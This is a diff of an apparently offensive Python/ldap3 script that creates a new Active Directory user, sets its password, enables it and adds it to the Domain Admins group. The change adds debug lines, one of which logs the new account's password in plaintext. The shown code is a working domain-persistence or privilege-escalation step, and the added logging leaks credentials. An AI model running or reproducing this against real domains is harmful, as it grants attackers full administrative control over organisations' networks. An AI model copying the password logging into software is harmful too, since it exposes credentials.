@@ -65,9 +65,13 @@ attrs = {"objectClass": ["user"], "sAMAccountName": args.new_user,
 
 try:
     conn.add(user_dn, attributes=attrs)
+    dbg(f"User {args.new_user} added with DN: {user_dn}")
     conn.extend.microsoft.modify_password(user_dn, pwd)
+    dbg(f"Password for {args.new_user} set to: {pwd}")
     conn.modify(user_dn, {"userAccountControl": [(MODIFY_REPLACE, [UAC_ENABLED])]})
+    dbg(f"User {args.new_user} enabled with UAC: {UAC_ENABLED}")
     conn.extend.microsoft.add_members_to_groups([user_dn], [da_dn])
+    dbg(f"User {args.new_user} added to Domain Admins group: {da_dn}")
     print(f"[+] {args.new_user} added to Domain Admins (pwd will expire).")
 except LDAPException as e:
     sys.exit(f"[!] Failure: {e}")
